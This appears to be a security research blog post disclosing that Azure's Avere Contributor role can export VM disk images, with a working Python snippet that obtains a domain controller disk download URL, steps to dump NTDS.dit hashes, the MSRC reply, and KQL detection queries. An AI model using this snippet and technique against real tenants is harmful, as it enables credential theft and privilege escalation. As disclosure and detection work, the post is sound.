Screenshots can be found here: https://web.archive.org/web/20240917142356/https://nullg0re.com/2024/03/permissive-azure-role-allows-vm-credential-dumping/


As always, jams:


# Introduction
While performing research recently I discovered an Azure RBAC role that, by default, is able to perform actions within the Azure portal that appeared to be more than it should have been allowed.

The Azure RBAC Role I’m referring to is the Avere Contributor role used to manage all things Avere vFXT for Azure.

Avere vFXT for Azure is a service offered by Azure and according to Microsoft documentation:

Avere vFXT for Azure is a filesystem caching solution for data-intensive high-performance computing (HPC) tasks. It lets you take advantage of cloud computing’s scalability to make your data accessible when and where it’s needed – even for data that’s stored in your own on-premises hardware.

Avere vFXT supports these common computing scenarios:

Hybrid cloud architecture – Avere vFXT for Azure can work with a hardware storage system, which provides the benefit of cloud computing without having to move files.
Cloud bursting – Avere vFXT for Azure can help you move your data to the cloud for a single project, or “lift and shift” the entire workflow permanently.
Simultaneously, while performing this research I learned about a really great resource: AzRoleAdvertizer.

This website contains a list of all the Azure RBAC roles and each of their accompanying Azure RBAC API permissions, complete with a reactive table in which you can lookup a given role, or a given permission and see all of the data that comes with.

When looking at the Avere Contributor role in AzRoleAdvertizer I found the following Azure RBAC API permissions:


Long list, I know. The juicy bits here are the following:

Microsoft.Compute/virtualMachines/* (Allows the Avere Contributor role to action any of the functionality in the virtualMachines/* space, including VM extensions that would allow an attacker to reset any VM users password or SSH key, or execute commands or scripts on either Windows or Linux OS VMs)
Microsoft.Compute/disks/* (Allows the Avere Contributor role to create VMDK backups of any VM in the tenant)
Microsoft.Storage/storageAccounts/* (Allows the Avere Contributor role to list the access keys for any Storage Account in the tenant, including CloudShell storage accounts)
The permission that we’re going to focus in in this blog is going to be the disks/* permission as this has a really interesting privilege escalation and lateral movement opportunity here:

The Avere Contributor role can create backups of any Virtual Machine in an organizations Azure tenant, including backed up Domain Controllers.

The Download
To create the VM backup, a Threat Actor with the Avere Contributor role could use the following Python snippet:
```python
def get_backup_url(token, subscriptionId, resourceGroup, vmDiskImage):
    url = "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.Compute/disks/{vmDiskImage}/BeginGetAccess?api-version=2022-03-02"
    headers = {
        "x-ms-client-session-id": "cb8c32a0f31e46f890d7e46b61b63cd9",
        "x-ms-command-name": "Microsoft_Azure_DiskMgmt.",
        "accept-language": "en",
        "authorization": f"Bearer {token}",
        "x-ms-effective-locale": "en.en-us",
        "content-type": "application/json",
        "accept": "*/*",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "x-ms-client-request-id": "c7255382-42a5-486a-ba20-9c0ad90ea004",
        "origin": "https://portal.azure.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-encoding": "gzip, deflate, br",
    }
    data = {
        "access":"read",
        "durationInSeconds": 3600000
    }
    req = requests.post(url, headers=headers, json=data)
    if req.status_code == 202:
        try:
            for k,v in req.headers.items():
                if k.lower() == 'location':
                    redirect_url = v
                    req2 = requests.get(redirect_url, headers=headers)
                    if req2.status_code == 200:
                        r = req2.json()
                        disk_download_url = r["accessSAS"]
                        print (f"[ + ] Found DC Disk VM Download URL: {disk_download_url}")
                        print (f"[ + ] Click above link to download VHD of Target Domain Controller, then follow the steps here to extract the secrets: https://drmarmar.com/vmdk-credentials")
                        return True
                    else:
                        print (f"[ ! ] GetBackupUrlError: Invalid Status Code for redirect_uri: StatusCode: {req2.status_code}\r\n\r\n{req2.text}")
                        exit()
        except Exception as e:
            print (f"[ ! ] GetBackupUrlError: Location Header Not Found: {e}")
            exit()
    else:
         print (f"[ ! ] GetBackupUrlError: Invalid Status Code: {req.status_code}\r\n\r\n{req.text}")
         exit()
```
This snippet will send a request to Azure, asking Azure to create the backup Virtual Machine Disk Image (VMDK), and then store the VMDK inside of a storage account. After performing this action, Azure’s API will respond to the request with a Shared Access Signature (SAS) URL for the VMDK file sitting in the storage account.

The Threat Actor would then take the SAS URL and open the URL in a browser, which would trigger the download of the VMDK file:


# Local Mounts
With the VMDK downloaded, the attacker would then need to use a tool like kpartx to partition the VMDK and attach it to the attackers local Linux filesystem:


Once the VMDK has been attached to the local filesystem, the Threat Actor would mount the partition to a local directory like /mnt/tmp:


With the filesystem fully prepared, the Threat Actor would use Impacket’s secretsdump.py script to dump the SAM and NTDS.dit databases to extract the organizations domain NTLM hashes:


If the organization has password sync enabled within their tenant or users are re-using their passwords between on-prem and cloud accounts, this could be a way for a Threat Actor to escalate privileges within the cloud, or even move laterally if the Threat Actor has a foothold on the organizations internal network.

A Threat Actor could crack these NTLM hashes offline or use pass-the-hash attacks or even Kerberos attacks against the organizations domain (this is considering the krbtgt NTLM hash is included in NTDS.dit).

Speaking of Kerberos, if the organization has DesktopSSO enabled, this could be a means for the Threat Actor to pivot back into the cloud as a Global Administrator in cases where MFA isn’t required for a Global Admin account.

# MSRC Response
I submitted this vulnerability to Microsoft on March 23, 2024. MSRC Responded on May 7th, 2024 as follows:


Image reads as follows:

Hello Tony,

Thank you for being patient. Upon investogation, our team determined that this is not a vulnerablity. The reported behaviour related to the permission appears ot be working as intended and is not an elevation of privilege. This report seems to be more of a feature request. We would also like to highlight that recently we have announced the decrepation of this solution by the end of 2025. However, we have shared your report with the team responsible for maintaining the product or service and they may review this report for any potential changes and/or appropriate action as needed to help keep customers protected.

Please feel free to let us know if you have queries.

As now, we are proceeding with the case closure. Kindly continue your research and help us protect our customers. We look forward to your future reports.

Regards,

MSRC

# Detection
Below is a KQL query you can use to see if this role is being used in your environment to exploit this issue:
```
AzureActivity
| where OperationNameValue == "MICROSOFT.COMPUTE/DISKS/BEGINGETACCESS/ACTION"
| where tostring(parse_json(Authorization).evidence.role) == "Avere Contributor"
If you would like to see any instance where a user has attempted create a backup of a Virtual Machine’s disk image, you can use the following KQL query as well:

AzureActivity
| where OperationNameValue == "MICROSOFT.COMPUTE/DISKS/BEGINGETACCESS/ACTION"
Conclusion
```
I identified a vulnerability within Microsoft Azure where the “Avere Contributor Role” can be used to download Disk Images of Virtual Machines and extract secrets from the downloaded VMDK files.  This vulnerability can lead to privilege escalation within an Azure tenant, within an on-premises environment, and can be used to move laterally within both the cloud environment and an organizations on-premises environment.


